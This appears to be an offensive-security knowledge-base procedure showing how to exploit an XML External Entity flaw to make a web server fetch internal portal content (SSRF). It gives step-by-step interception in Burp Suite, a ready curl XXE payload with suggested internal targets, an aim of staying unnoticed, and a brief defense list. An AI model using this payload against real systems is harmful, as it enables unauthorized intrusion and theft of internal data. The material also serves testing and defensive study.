---
id: 76ce3cdb-42bf-46f1-b5b3-a47f2adfa941
name: XXE-to-Access-Internal-Portals
type: procedure
verified: true
submitted: true
created_at: '2020-08-04T19:29:48.509038+00:00'
updated_at: '2023-05-26T18:08:56.956264+00:00'
platforms:
  - Web
tags:
  - '[[tags/owasp]]'
  - '[[tags/owasp top 10]]'
  - '[[tags/Web Applications]]'
  - '[[tags/xxe]]'
tactics:
  - '[[Initial Access]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
sub_techniques: []
commands:
  - '[[commands/curl-send-xxe-payload]]'
tools:
  - '[[tools/Burp-Suite]]'
validated: true
---

# XXE-to-Access-Internal-Portals

## Summary

This procedure demonstrates how to exploit an XML External Entity (XXE) vulnerability in a web application to perform Server-Side Request Forgery (SSRF) and access internal or private portals on the network. By injecting malicious external entities into an XML payload, the application can be tricked into making unauthorized requests to internal resources, potentially retrieving sensitive information such as configuration files or data from intranet services.

## Description

XML External Entity processing vulnerabilities occur when an application parses XML input without properly disabling external entity resolution. Attackers can define custom entities that reference external resources, leading to SSRF attacks where the server fetches content from internal networks inaccessible from the internet. This is particularly useful in scenarios where the application authenticates via XML payloads, allowing modification during transit (e.g., via a proxy). The technique targets public-facing web applications vulnerable to OWASP Top 10 A4:2017 (XXE) and can lead to data disclosure from internal systems like admin portals or databases. Prerequisites include identifying an XML-processing endpoint and intercepting requests to inject the payload.

## Requirements

1. Access to a vulnerable web application endpoint that processes XML input (e.g., authentication or data submission forms).
2. A proxy tool like Burp Suite to intercept and modify HTTP requests.
3. Network position allowing observation of responses, ideally with the ability to handle large or binary responses.
4. Basic knowledge of XML syntax and HTTP POST requests.

## Defense

Defensive measures and detection strategies:

- Disable external entity processing in XML parsers (e.g., set 'disallow-doctype-decl' to true in libxml2).
- Use Web Application Firewalls (WAFs) to block XML payloads containing DOCTYPE declarations or entity expansions.
- Validate and sanitize all XML input to prevent entity injection.
- Monitor server logs for unusual internal requests originating from application servers.
- Implement network segmentation to restrict application server access to internal resources.

## Objectives

1. Intercept a legitimate XML request to the target application.
2. Inject an XXE payload to force the server to request internal resources.
3. Retrieve and analyze sensitive data from the internal portal via the application's response.
4. Confirm successful SSRF without alerting the application.

## Instructions

### Step 1: Intercept Legitimate XML Authentication Request

**Context**: Begin by capturing a normal XML-based authentication request to understand the structure and identify the endpoint. This establishes a baseline for modification and ensures the application processes XML as expected.

**Tool Usage** ([[tools/Burp-Suite]]):

Use Burp Suite Proxy to intercept traffic. Configure your browser to route through Burp and submit an authentication request (e.g., login form) that sends XML data.

> The intercepted request should show a POST to an endpoint like /auth with Content-Type: application/xml and a body like:
>
> ```xml
> <auth>
>   <user>admin</user>
>   <pass>password</pass>
> </auth>
> ```
>
> Expected output: A 200 OK response with authentication success or token, confirming XML parsing works. If the request fails, verify the endpoint accepts XML.

### Step 2: Modify Request with XXE Payload to Access Internal Portal

**Context**: Inject an external SYSTEM entity into the XML DOCTYPE declaration to force the server to fetch content from an internal URL. This exploits the parser to perform SSRF, embedding the internal response within the application's reply.

**Command** ([[commands/curl-send-xxe-payload]]):

```bash
curl -X POST http://target-app.com/auth \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE auth [<!ENTITY xxe SYSTEM "http://internal-portal.example.com/sensitive-data">]><auth><user>&xxe;</user><pass>password</pass></auth>'
```

> This command sends the modified XML payload, where the entity &xxe; resolves to the internal portal's content during parsing. Replace http://internal-portal.example.com/sensitive-data with the actual internal URL (e.g., http://localhost/admin or http://10.0.0.1/config). Expected output: The response body includes the internal portal's HTML or data (e.g., login page source or file contents) embedded in the <user> field or as an error message if expansion is visible. Success is indicated by receiving internal data not accessible externally; failures may show parser errors if XXE is partially mitigated.
